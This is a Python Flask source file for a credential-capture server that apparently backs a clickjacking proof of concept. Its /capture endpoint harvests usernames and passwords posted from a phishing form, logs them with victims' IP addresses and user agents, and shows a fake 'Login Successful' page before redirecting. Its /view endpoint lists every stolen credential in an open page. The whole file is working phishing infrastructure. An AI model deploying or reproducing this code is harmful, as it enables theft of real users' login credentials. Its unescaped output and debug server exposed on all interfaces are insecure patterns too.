#!/usr/bin/env python3
from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
from datetime import datetime
import json
import os

app = Flask(__name__)
CORS(app)

# Store captured credentials
CAPTURED_FILE = 'captured_credentials.txt'

@app.route('/')
def index():
    return send_from_directory('.', 'clickjacking_poc.html')

@app.route('/capture', methods=['POST'])
def capture():
    """Capture credentials from phishing form"""
    try:
        # Get form data
        username = request.form.get('username', 'N/A')
        password = request.form.get('password', 'N/A')
        
        # Prepare log entry
        log_entry = {
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'username': username,
            'password': password,
            'ip': request.remote_addr,
            'user_agent': request.headers.get('User-Agent', 'Unknown')
        }
        
        # Save to file
        with open(CAPTURED_FILE, 'a') as f:
            f.write(json.dumps(log_entry) + '\n')
        
        # Print to console
        print('\n' + '='*60)
        print('🎯 CREDENTIALS CAPTURED!')
        print('='*60)
        print(f"Time: {log_entry['timestamp']}")
        print(f"Username: {username}")
        print(f"Password: {password}")
        print(f"IP: {log_entry['ip']}")
        print('='*60 + '\n')
        
        # Redirect to real site (optional)
        return '''
        <html>
        <head>
            <meta http-equiv="refresh" content="2;url=https://www.google.com">
        </head>
        <body style="font-family: Arial; text-align: center; padding: 50px;">
            <h2>✓ Login Successful</h2>
            <p>Redirecting...</p>
        </body>
        </html>
        '''
        
    except Exception as e:
        print(f'Error: {e}')
        return jsonify({'error': str(e)}), 500

@app.route('/view')
def view_captured():
    """View all captured credentials"""
    if not os.path.exists(CAPTURED_FILE):
        return '<h2>No credentials captured yet</h2>'
    
    html = '<html><head><title>Captured Credentials</title>'
    html += '<style>body{font-family:monospace;padding:20px;background:#1a1a1a;color:#0f0;}'
    html += 'table{width:100%;border-collapse:collapse;}'
    html += 'th,td{border:1px solid #0f0;padding:12px;text-align:left;}'
    html += 'th{background:#0a0a0a;}</style></head><body>'
    html += '<h1>🎯 Captured Credentials</h1>'
    html += '<table><tr><th>Time</th><th>Username</th><th>Password</th><th>IP</th><th>User Agent</th></tr>'
    
    with open(CAPTURED_FILE, 'r') as f:
        for line in f:
            try:
                data = json.loads(line.strip())
                html += f'''<tr>
                    <td>{data['timestamp']}</td>
                    <td><strong>{data['username']}</strong></td>
                    <td><strong style="color:#ff5555;">{data['password']}</strong></td>
                    <td>{data['ip']}</td>
                    <td>{data['user_agent'][:50]}...</td>
                </tr>'''
            except:
                pass
    
    html += '</table></body></html>'
    return html

if __name__ == '__main__':
    print('\n' + '='*60)
    print('🎯 CREDENTIAL CAPTURE SERVER STARTED')
    print('='*60)
    print('Main Page: http://localhost:8000/')
    print('View Captures: http://localhost:8000/view')
    print('='*60 + '\n')
    
    app.run(host='0.0.0.0', port=8000, debug=True)